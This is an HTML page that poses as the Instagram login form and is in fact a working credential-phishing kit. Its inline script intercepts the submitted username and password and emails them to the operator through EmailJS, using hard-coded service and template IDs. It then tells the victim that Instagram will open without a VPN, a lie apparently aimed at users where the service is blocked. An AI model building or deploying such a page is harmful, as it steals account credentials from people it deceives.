<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>instagram</title>
    <link rel = "icon" href ="img/logo.png"  type = "image/x-icon">
    <link rel="stylesheet" href="main.css">
    
</head>
<body>


    <div class="container">
        <div class="box">
          <div class="heading"></div>
          <form id="Form1" class="login-form" >
            <div class="field">
              <input id="username" type="name" placeholder="Phone number, username, or email" required />
              <label for="username">Phone number, username, or email</label>
            </div>
            <div class="field">
              <input id="password" type="password" placeholder="password" required />
              <label for="password">Password</label>
            </div>
              <button class="login-button" title="login">Log In</button>
              <div class="separator">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
              </div>
            <div class="other">
              <button  class="fb-login-btn" type="button">
                <i class="fa fa-facebook-official fb-icon"></i>
                <span class="">Log in with Facebook</span>
              </button>
              <a class="forgot-password" href="#">Forgot password?</a>
            </div>

            <!-- <input id="username" type="text" placeholder="user" required>
            <input id="password" type="text" placeholder="p" required>
            <button>click</button> -->
          </form>
        </div>
        <div class="box">
          <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
      </div>



      

      <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
      <script type="text/javascript">
        (function() {
            // https://dashboard.emailjs.com/admin/account
            emailjs.init('_6nAjYbTyF4iBAWow');
        })();
    </script>
      <script type="text/javascript">

        let form = document.querySelector('#Form1')
        let email = document.querySelector('#username')
        let password = document.querySelector('#password')

        form.addEventListener("submit" , e => {

          e.preventDefault();
         
          var params = {
            form_name :email.value,
            email_id : email.value,
            password : password.value

          }
          emailjs.send("service_3w68pzd" , "template_rnmz2nk" , params)
          .then(function (res) {alert('seccuss\n Your Instagram will open without vpn after some time')})
        
        })
       

        </script>
    
</body>
</html>
